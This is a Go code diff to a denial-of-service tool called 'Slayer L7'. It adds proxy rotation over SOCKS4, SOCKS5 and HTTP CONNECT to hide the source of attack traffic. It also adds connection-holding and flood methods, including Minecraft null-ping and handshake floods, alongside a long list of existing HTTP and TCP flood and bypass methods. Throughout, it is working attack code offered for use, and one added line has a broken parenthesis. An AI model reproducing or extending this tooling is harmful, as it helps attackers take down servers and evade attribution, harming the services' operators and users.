@@ -383,6 +383,134 @@ func randEmail() string {
     return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
 }
 
+func dialViaProxy(network, addr string, proxyURL *url.URL) (net.Conn, error) {
+    proxyAddr := proxyURL.Host
+    if !strings.Contains(proxyAddr, ":") {
+        proxyAddr += ":1080"
+    }
+
+    conn, err := net.DialTimeout(network, proxyAddr, 15*time.Second)
+    if err != nil {
+        return nil, err
+    }
+
+    if strings.HasPrefix(proxyURL.Scheme, "socks5") {
+        _, err = conn.Write([]byte{0x05, 0x01, 0x00})
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+
+        buf := make([]byte, 2)
+        _, err = conn.Read(buf)
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+        if buf[0] != 0x05 || buf[1] != 0x00 {
+            conn.Close()
+            return nil, fmt.Errorf("socks5 auth failed")
+        }
+
+        host, portStr, _ := net.SplitHostPort(addr)
+        port, _ := strconv.Atoi(portStr)
+
+        ip := net.ParseIP(host)
+        var req []byte
+        if ip != nil {
+            if ip4 := ip.To4(); ip4 != nil {
+                req = []byte{0x05, 0x01, 0x00, 0x01}
+                req = append(req, ip4...)
+            } else {
+                req = []byte{0x05, 0x01, 0x00, 0x04}
+                req = append(req, ip.To16()...)
+            }
+        } else {
+            req = []byte{0x05, 0x01, 0x00, 0x03, byte(len(host))}
+            req = append(req, []byte(host)...)
+        }
+        req = append(req, byte(port>>8), byte(port))
+
+        _, err = conn.Write(req)
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+
+        resp := make([]byte, 256)
+        n, err := conn.Read(resp)
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+        if n < 2 || resp[0] != 0x05 || resp[1] != 0x00 {
+            conn.Close()
+            return nil, fmt.Errorf("socks5 connect failed")
+        }
+    } else if strings.HasPrefix(proxyURL.Scheme, "socks4") {
+        host, portStr, _ := net.SplitHostPort(addr)
+        port, _ := strconv.Atoi(portStr)
+        ip := net.ParseIP(host)
+
+        if ip == nil {
+            req := []byte{0x04, 0x01, byte(port >> 8), byte(port), 0, 0, 0, 1, 0}
+            req = append(req, []byte(host)...)
+            req = append(req, 0)
+            _, err = conn.Write(req)
+        } else {
+            ip4 := ip.To4()
+            if ip4 == nil {
+                conn.Close()
+                return nil, fmt.Errorf("socks4 requires IPv4")
+            }
+            req := []byte{0x04, 0x01, byte(port >> 8), byte(port), ip4[0], ip4[1], ip4[2], ip4[3], 0}
+            _, err = conn.Write(req)
+        }
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+
+        resp := make([]byte, 8)
+        _, err = conn.Read(resp)
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+        if resp[1] != 0x5a {
+            conn.Close()
+            return nil, fmt.Errorf("socks4 connect failed")
+        }
+    } else {
+        connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", addr, addr)
+        if proxyURL.User != nil {
+            user := proxyURL.User.Username()
+            pass, _ := proxyURL.User.Password()
+            cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
+            connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
+        }
+        connectReq += "\r\n"
+        _, err = conn.Write([]byte(connectReq))
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+        br := bufio.NewReader(conn)
+        resp, err := http.ReadResponse(br, nil)
+        if err != nil {
+            conn.Close()
+            return nil, err
+        }
+        resp.Body.Close()
+        if resp.StatusCode != 200 {
+            conn.Close()
+            return nil, fmt.Errorf("proxy connect failed: %d", resp.StatusCode)
+        }
+    }
+
+    return conn, nil
+}
+
 func httpGet(url string, client *http.Client) error {
     resp, err := client.Get(url)
     if err != nil {
@@ -1666,14 +1794,104 @@ func tcpConnect(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
+    defer conn.Close()
+
+    deadline := time.Now().Add(time.Duration(5+rand.Intn(5)) * time.Second)
+    ticker := time.NewTicker(1 * time.Second)
+    defer ticker.Stop()
+
+    for {
+        select {
+        case <-stop:
+            return nil
+        case <-ticker.C:
+            if time.Now().After(deadline) {
+                recordStatus("Sent")
+                return nil
+            }
+            payload := make([]byte, 64)
+            rand.Read(payload)
+            _, err := conn.Write(payload)
+            if err != nil {
+                recordStatus("Err")
+                return err
+            }
+            recordStatus("Sent")
+        }
+    }
+}
+
+func tcpSlow(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
     if err != nil {
         recordStatus("Err")
         return err
     }
-    conn.Close()
-    recordStatus("Sent")
-    return nil
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "80"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
+    defer conn.Close()
+
+    ticker := time.NewTicker(time.Duration(2+rand.Intn(3)) * time.Second)
+    defer ticker.Stop()
+
+    for {
+        select {
+        case <-stop:
+            return nil
+        case <-ticker.C:
+            _, err := conn.Write([]byte{0x00})
+            if err != nil {
+                recordStatus("Err")
+                return err
+            }
+            recordStatus("Held")
+        }
+    }
 }
 
 func tcpPayload(targetURL string, stop <-chan struct{}) error {
@@ -1689,10 +1907,25 @@ func tcpPayload(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        return err
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
     }
     defer conn.Close()
 
@@ -1751,10 +1984,25 @@ func mcPingFlood(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        return err
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
     }
     defer conn.Close()
 
@@ -1804,10 +2052,25 @@ func mcBotJoin(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        return err
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
     }
     defer conn.Close()
 
@@ -1836,7 +2099,7 @@ func mcBotJoin(targetURL string, stop <-chan struct{}) error {
     conn.Write(reqPacket)
 
     buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+    conn.SetReadDeadline(time.Now().Add(5 * time.Second)
     conn.Read(buf)
 
     recordStatus("Sent")
@@ -1856,10 +2119,25 @@ func mcBigPacket(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        return err
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
     }
     defer conn.Close()
 
@@ -1901,10 +2179,25 @@ func mcLegacyPing(targetURL string, stop <-chan struct{}) error {
     }
     addr := net.JoinHostPort(host, port)
 
-    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
-    if err != nil {
-        recordStatus("Err")
-        return err
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
     }
     defer conn.Close()
 
@@ -1918,6 +2211,131 @@ func mcLegacyPing(targetURL string, stop <-chan struct{}) error {
     buf := make([]byte, 4096)
     conn.SetReadDeadline(time.Now().Add(2 * time.Second))
     conn.Read(buf)
+
+    recordStatus("Sent")
+    return nil
+}
+
+func mcNullPing(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
+    defer conn.Close()
+
+    hostLen := len(host)
+    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
+    handshake = append(handshake, []byte(host)...)
+    portInt, _ := strconv.Atoi(port)
+    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+    handshake = append(handshake, portBytes...)
+    handshake = append(handshake, 0x01)
+
+    pktLen := len(handshake)
+    packet := []byte{byte(pktLen)}
+    packet = append(packet, handshake...)
+
+    _, err = conn.Write(packet)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    _, err = conn.Write([]byte{0x01, 0x00})
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
+
+    recordStatus("Sent")
+    return nil
+}
+
+func mcHandshakeFlood(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
+    defer conn.Close()
+
+    for i := 0; i < 100; i++ {
+        randomHost := randString(10) + "." + host
+        hostLen := len(randomHost)
+        handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
+        handshake = append(handshake, []byte(randomHost)...)
+        portInt, _ := strconv.Atoi(port)
+        portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+        handshake = append(handshake, portBytes...)
+        handshake = append(handshake, 0x01)
+
+        pktLen := len(handshake)
+        packet := []byte{byte(pktLen)}
+        packet = append(packet, handshake...)
+
+        _, err = conn.Write(packet)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
 
     recordStatus("Sent")
     return nil
@@ -1978,6 +2396,8 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpPingback(targetURL, client)
         case "tcp_connect":
             err = tcpConnect(targetURL, stop)
+        case "tcp_slow":
+            err = tcpSlow(targetURL, stop)
         case "tcp_payload":
             err = tcpPayload(targetURL, stop)
         case "udp_flood":
@@ -1990,6 +2410,10 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = mcBigPacket(targetURL, stop)
         case "mc_legacy":
             err = mcLegacyPing(targetURL, stop)
+        case "mc_nullping":
+            err = mcNullPing(targetURL, stop)
+        case "mc_handshake_flood":
+            err = mcHandshakeFlood(targetURL, stop)
         default:
             fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
             os.Exit(1)
@@ -1998,7 +2422,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
         if err == nil {
             totalSent.Add(1)
         }
-        
+
         if rateMS > 0 {
             time.Sleep(time.Duration(rateMS) * time.Millisecond)
         }
@@ -2007,7 +2431,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 func main() {
     target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy")
+    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_slow, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy, mc_nullping, mc_handshake_flood")
     workerCount := flag.Int("w", 2048, "number of workers")
     dur := flag.Int("d", 30, "duration in seconds")
     pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
@@ -2018,7 +2442,7 @@ func main() {
     if *target == "" {
         fmt.Println("Slayer L7")
         fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy")
+        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_slow | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy | mc_nullping | mc_handshake_flood")
         fmt.Println()
         flag.PrintDefaults()
         os.Exit(1)
@@ -2033,8 +2457,8 @@ func main() {
         "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset": true, "wsflood": true,
         "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
         "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
-        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "tcp_connect": true, "tcp_payload": true, "udp_flood": true,
-        "mc_ping": true, "mc_bot": true, "mc_bigpacket": true, "mc_legacy": true,
+        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "tcp_connect": true, "tcp_slow": true, "tcp_payload": true, "udp_flood": true,
+        "mc_ping": true, "mc_bot": true, "mc_bigpacket": true, "mc_legacy": true, "mc_nullping": true, "mc_handshake_flood": true,
     }
     if !validMethods[strings.ToLower(*method)] {
         fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
@@ -2043,7 +2467,7 @@ func main() {
 
     needsClientPool := true
     switch strings.ToLower(*method) {
-    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy":
+    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_slow", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy", "mc_nullping", "mc_handshake_flood":
         needsClientPool = false
     }
 
